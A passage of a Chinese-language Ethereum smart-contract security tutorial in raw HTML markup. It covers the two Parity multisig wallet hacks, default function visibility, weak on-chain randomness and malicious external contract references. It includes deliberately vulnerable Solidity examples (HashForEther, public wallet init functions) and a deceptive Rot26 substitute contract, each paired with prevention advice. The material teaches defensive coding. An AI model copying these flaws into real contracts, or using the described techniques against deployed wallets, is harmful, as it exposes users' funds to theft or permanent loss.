class="token punctuation">.</span>data<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>      _walletLibrary<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">// FIELDS</span>  <span class="token builtin">address</span> <span class="token keyword">constant</span> _walletLibrary <span class="token operator">=</span>    <span class="token number">0xcafecafecafecafecafecafecafecafecafecafe</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，<code>Wallet</code> 合约本质上是通过 delegate call 将所有调用传递给 <code>WalletLibrary</code> 合约。此代码片段中的常量 <code>_walletLibrary</code> 地址充当实际部署的 <code>WalletLibrary</code> 合约的占位符（位于 <code>0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4</code>）。</p><p>这些合约的预期操作是拥有一个简单的低成本可部署钱包合约，其代码库和主要功能都在 <code>WalletLibrary</code> 合约中。不幸的是，<code>WalletLibrary</code> 合约本身就是一个合约，并保持着自己的状态。你能明白为什么这可能是一个问题吗？</p><p>可以向 <code>WalletLibrary</code> 合约本身发送调用。具体来说，<code>WalletLibrary</code> 合约可以被初始化并被拥有。事实上，用户就是这样做的，调用 <code>WalletLibrary</code> 合约上的 <code>initWallet</code> 函数并成为库合约的所有者。同一用户随后调用了 <code>kill</code> 函数。因为用户是库合约的所有者，所以 modifier 通过并且库合约自毁。由于现有的所有 <code>Wallet</code> 合约都引用此库合约并且不包含更改此引用的方法，因此它们的所有功能，包括提取以太币的能力，都与 <code>WalletLibrary</code> 合约一起丢失。结果，所有此类 Parity 多重签名钱包中的所有以太币立即丢失或永久无法恢复。</p><h2 id="默认可见性-Default-Visibilities"><a href="#默认可见性-Default-Visibilities" class="headerlink" title="默认可见性 (Default Visibilities)"></a>默认可见性 (Default Visibilities)</h2><p>Solidity 中的函数具有可见性说明符，指示如何调用它们。可见性决定了一个函数是否可以被用户、其他派生合约、仅在内部或仅在外部调用。有四个可见性说明符，在 <a href="https://docs.soliditylang.org/en/latest/contracts.html?highlight=library#visibility-and-getters">Solidity 文档</a> 中有详细描述。<strong>函数默认为 public，允许用户在外部调用它们。</strong>我们现在将看到不正确地使用可见性说明符如何导致智能合约中的一些破坏性漏洞。</p><h3 id="漏洞-4"><a href="#漏洞-4" class="headerlink" title="漏洞"></a>漏洞</h3><p>函数的默认可见性是 <code>public</code>，因此外部用户可以调用未指定其可见性的函数。当开发人员错误地在应该是私有的（或只能在合约本身内调用）的函数上忽略可见性说明符时，就会出现问题。</p><p>让我们快速探索一个简单的例子：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">HashForEther</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">withdrawWinnings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Winner if the last 8 hex characters of the address are 0</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_sendWinnings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">function</span> <span class="token function">_sendWinnings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这个简单的合约旨在充当地址猜测赏金游戏。为了赢得合约的余额，用户必须生成一个最后 8 个十六进制字符为 0 的以太坊地址。一旦实现，他们可以调用<code>withdrawWinnings</code> 函数来获得他们的赏金。</p><p>不幸的是，尚未指定功能的可见性。特别是 <code>_sendWinnings</code> 函数是 <code>public</code>（默认），因此任何地址都可以调用此函数来窃取赏金。</p><h3 id="预防技术-4"><a href="#预防技术-4" class="headerlink" title="预防技术"></a>预防技术</h3><p><strong>始终指定合同中所有功能的可见性是一种很好的做法</strong>，即使它们是 <code>public</code>。最近版本的 solc 对没有明确可见性设置的函数显示警告，以鼓励这种做法。</p><p>注：当前版本的 Solidity 对没有指定可见性修饰符的函数显示 SyntaxError 错误。</p><h3 id="真实世界的例子：Parity-Multisig-Wallet-First-Hack"><a href="#真实世界的例子：Parity-Multisig-Wallet-First-Hack" class="headerlink" title="真实世界的例子：Parity Multisig Wallet (First Hack)"></a>真实世界的例子：Parity Multisig Wallet (First Hack)</h3><p>在第一次 Parity 多重签名攻击中，价值约 3100 万美元的以太币被盗，大部分来自三个钱包。 Haseeb Qureshi(<a href="https://www.freecodecamp.org/news/a-hacker-stole-31m-of-ether-how-it-happened-and-what-it-means-for-ethereum-9e5dc29e33ce">A hacker stole $31M of Ether — how it happened, and what it means for Ethereum</a>) 很好地回顾了这是如何完成的。</p><p>本质上，多重签名钱包是由基本的 <code>Wallet</code> 合约构成的，该合约调用包含核心功能的库合约（如 真实世界的例子：Parity Multisig Wallet (Second Hack) 中所述）。库合约包含初始化钱包的代码，从以下代码片段可以看出：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">WalletLibrary</span> <span class="token keyword">is</span> WalletEvents <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">// METHODS</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">// constructor is given number of sigs required to do protected</span>  <span class="token comment">// "onlymanyowners" transactions as well as the selection of addresses</span>  <span class="token comment">// capable of confirming them</span>  <span class="token keyword">function</span> <span class="token function">initMultiowned</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> _owners<span class="token punctuation">,</span> <span class="token builtin">uint</span> _required<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    m_numOwners <span class="token operator">=</span> _owners<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    m_owners<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    m_ownerIndex<span class="token punctuation">[</span><span class="token builtin">uint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> _owners<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      m_owners<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span>_owners<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      m_ownerIndex<span class="token punctuation">[</span><span class="token builtin">uint</span><span class="token punctuation">(</span>_owners<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    m_required <span class="token operator">=</span> _required<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">// constructor - just pass on the owner array to multiowned and</span>  <span class="token comment">// the limit to daylimit</span>  <span class="token keyword">function</span> <span class="token function">initWallet</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> _owners<span class="token punctuation">,</span> <span class="token builtin">uint</span> _required<span class="token punctuation">,</span> <span class="token builtin">uint</span> _daylimit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">initDaylimit</span><span class="token punctuation">(</span>_daylimit<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">initMultiowned</span><span class="token punctuation">(</span>_owners<span class="token punctuation">,</span> _required<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，这两个函数都没有指定它们的可见性，因此它们都默认为 <code>public</code>。 <code>initWallet</code> 函数在钱包的构造函数中调用，并设置多重签名钱包的所有者，如 <code>initMultiowned</code> 函数所示。由于这些函数意外地被公开，攻击者能够在部署的合约上调用这些函数，将所有权重置为攻击者的地址。作为所有者，攻击者随后耗尽了所有以太币的钱包。</p><h2 id="熵错觉-Entropy-Illusion"><a href="#熵错觉-Entropy-Illusion" class="headerlink" title="熵错觉 (Entropy Illusion)"></a>熵错觉 (Entropy Illusion)</h2><p><strong>以太坊区块链上的所有交易都是确定性的状态转换操作。这意味着每笔交易都以可计算的方式修改以太坊生态系统的全局状态，没有不确定性。</strong>这具有基本含义，即以太坊中没有熵或随机性的来源。实现去中心化熵（随机性）是一个众所周知的问题，已经提出了许多解决方案，包括 <a href="https://github.com/randao/randao">RANDAO</a> 或使用哈希链，正如 Vitalik Buterin 在博客文章“Validator Ordering and Randomness in PoS”中所描述的那样。</p><h3 id="漏洞-5"><a href="#漏洞-5" class="headerlink" title="漏洞"></a>漏洞</h3><p>在以太坊平台上建立的一些第一批合约是基于赌博的。从根本上说，赌博需要不确定性（赌注），这使得在区块链（确定性系统）上构建赌博系统相当困难。很明显，不确定性必须来自区块链外部的来源。这对于玩家之间的赌注是可能的（例如<a href="https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract">commit–reveal 技术</a>）；但是，如果您想实现一个合约来充当“the house”（如二十一点或轮盘赌），则要困难得多。一个常见的陷阱是使用未来区块变量 —— 即包含有关交易区块的信息的变量，其值尚不清楚，例如哈希、时间戳、区块编号或gas限制。这些问题是它们由开采区块的矿工控制，因此并不是真正随机的。例如，考虑一个轮盘赌智能合约，如果下一个块哈希以偶数结尾，则返回一个黑色数字的逻辑。一个矿工（或矿工池）可以在黑色上下注 100 万美元。如果他们解决下一个块并发现哈希以奇数结尾，他们可以很高兴地不发布他们的块并挖掘另一个块，直到他们找到块哈希为偶数的解决方案（假设块奖励和费用小于100 万美元）。正如 Martin Swende 在他出色的<a href="http://martin.swende.se/blog/Breaking_the_house.html">博客文章</a>中所展示的那样，使用过去或现在的变量可能更具破坏性。此外，单独使用区块变量意味着一个区块中所有交易的伪随机数都是相同的，因此攻击者可以通过在一个区块内进行许多交易来倍增他们的胜利（应该有一个最大赌注）。</p><h3 id="预防技术-5"><a href="#预防技术-5" class="headerlink" title="预防技术"></a>预防技术</h3><p><strong>熵（随机性）的来源必须在区块链之外。</strong>这可以在具有诸如 <a href="https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract">commit–reveal 技术</a> 等系统的对等点之间完成，或者通过将信任模型更改为一组参与者（如在 <a href="https://github.com/randao/randao">RANDAO</a> 中）。这也可以通过充当随机预言机的中心化实体来完成。块变量（通常有一些例外）不应该用于获取熵，因为它们可以被矿工操纵。</p><h3 id="现实世界的例子：PRNG-合约"><a href="#现实世界的例子：PRNG-合约" class="headerlink" title="现实世界的例子：PRNG 合约"></a>现实世界的例子：PRNG 合约</h3><p>2018 年 2 月，Arseny Reutov 在博客(<a href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620">Predicting Random Numbers in Ethereum Smart Contracts</a>)中介绍了他对使用某种伪随机数生成器 (PRNG) 的 3,649 个实时智能合约的分析；他发现了 43 份可以利用的合约。</p><h2 id="外部合约引用-External-Contract-Referencing"><a href="#外部合约引用-External-Contract-Referencing" class="headerlink" title="外部合约引用 (External Contract Referencing)"></a>外部合约引用 (External Contract Referencing)</h2><p>以太坊“世界计算机”的好处之一是能够重用代码并与已经部署在网络上的合约进行交互。因此，<strong>大量合约引用外部合约，通常是通过外部消息调用。这些外部消息调用可以以一些不明显的方式掩盖恶意行为者的意图</strong>，我们现在将对其进行检查。</p><h3 id="漏洞-6"><a href="#漏洞-6" class="headerlink" title="漏洞"></a>漏洞</h3><p>在 Solidity 中，任何地址都可以转换为合约，无论该地址处的代码是否代表正在转换的合约类型。这可能会导致问题，尤其是当合约的作者试图隐藏恶意代码时。让我们用一个例子来说明这一点。</p><p>考虑一段像 Rot13Encryption.sol 这样的代码，它初步实现了 <a href="https://en.wikipedia.org/wiki/ROT13">ROT13 密码</a>。</p><p>示例8. Rot13Encryption.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// encryption contract</span><span class="token keyword">contract</span> <span class="token class-name">Rot13Encryption</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">event</span> <span class="token function">Result</span><span class="token punctuation">(</span><span class="token builtin">string</span> convertedString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// rot13-encrypt a string</span>    <span class="token keyword">function</span> rot13Encrypt <span class="token punctuation">(</span><span class="token builtin">string</span> text<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint256</span> length <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token builtin">byte</span> char <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">// inline assembly to modify the string</span>            <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// get the first byte</span>                char <span class="token operator">:=</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span>                <span class="token comment">// if the character is in [n,z], i.e. wrapping</span>                <span class="token keyword">if</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">gt</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lt</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x7B</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token comment">// subtract from the ASCII number 'a',</span>                <span class="token comment">// the difference between character &lt;char> and 'z'</span>                <span class="token punctuation">&#123;</span> char<span class="token operator">:=</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">0x7A</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token function">iszero</span><span class="token punctuation">(</span><span class="token function">eq</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// ignore spaces</span>                <span class="token comment">// add 13 to char</span>                <span class="token punctuation">&#123;</span><span class="token function">mstore8</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mul</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">emit</span> <span class="token function">Result</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// rot13-decrypt a string</span>    <span class="token keyword">function</span> rot13Decrypt <span class="token punctuation">(</span><span class="token builtin">string</span> text<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint256</span> length <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token builtin">byte</span> char <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span>                char <span class="token operator">:=</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">gt</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lt</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span> char<span class="token operator">:=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token function">sub</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token function">iszero</span><span class="token punctuation">(</span><span class="token function">eq</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span><span class="token function">mstore8</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mul</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">sub</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">emit</span> <span class="token function">Result</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这段代码只接受一个字符串（字母 a-z，没有验证）并通过将每个字符向右移动 13 位（环绕 <code>z</code>）对其进行加密；即，<code>a</code> 转移到 <code>n</code> 和 <code>x</code> 转移到 <code>k</code>。不需要理解前面合约中的组件来理解正在讨论的问题，因此不熟悉组件的读者可以放心地忽略它。</p><p>现在考虑以下合约，它使用此代码进行加密：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">import</span> <span class="token string">"Rot13Encryption.sol"</span><span class="token punctuation">;</span><span class="token comment">// encrypt your top-secret info</span><span class="token keyword">contract</span> <span class="token class-name">EncryptionContract</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// library for encryption</span>    Rot13Encryption encryptionLibrary<span class="token punctuation">;</span>    <span class="token comment">// constructor - initialize the library</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span>Rot13Encryption _encryptionLibrary<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        encryptionLibrary <span class="token operator">=</span> _encryptionLibrary<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">encryptPrivateData</span><span class="token punctuation">(</span><span class="token builtin">string</span> privateInfo<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// potentially do some operations here</span>        encryptionLibrary<span class="token punctuation">.</span><span class="token function">rot13Encrypt</span><span class="token punctuation">(</span>privateInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约的问题是 <code>encryptionLibrary</code> 地址不是公开的或恒定的。因此，合约的部署者可以在构造函数中给出一个指向该合约的地址：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// encryption contract</span><span class="token keyword">contract</span> <span class="token class-name">Rot26Encryption</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">event</span> <span class="token function">Result</span><span class="token punctuation">(</span><span class="token builtin">string</span> convertedString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// rot13-encrypt a string</span>    <span class="token keyword">function</span> rot13Encrypt <span class="token punctuation">(</span><span class="token builtin">string</span> text<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint256</span> length <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token builtin">byte</span> char <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">// inline assembly to modify the string</span>            <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// get the first byte</span>                char <span class="token operator">:=</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span>                <span class="token comment">// if the character is in [n,z], i.e. wrapping</span>                <span class="token keyword">if</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">gt</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lt</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x7B</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token comment">// subtract from the ASCII number 'a',</span>                <span class="token comment">// the difference between character &lt;char> and 'z'</span>                <span class="token punctuation">&#123;</span> char<span class="token operator">:=</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">0x7A</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>                <span class="token comment">// ignore spaces</span>                <span class="token keyword">if</span> <span class="token function">iszero</span><span class="token punctuation">(</span><span class="token function">eq</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token comment">// add 26 to char!</span>                <span class="token punctuation">&#123;</span><span class="token function">mstore8</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mul</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">emit</span> <span class="token function">Result</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// rot13-decrypt a string</span>    <span class="token keyword">function</span> rot13Decrypt <span class="token punctuation">(</span><span class="token builtin">string</span> text<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint256</span> length <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token builtin">byte</span> char <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span>                char <span class="token operator">:=</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">gt</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lt</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span> char<span class="token operator">:=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token function">sub</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token function">iszero</span><span class="token punctuation">(</span><span class="token function">eq</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span><span class="token function">mstore8</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mul</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">sub</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span 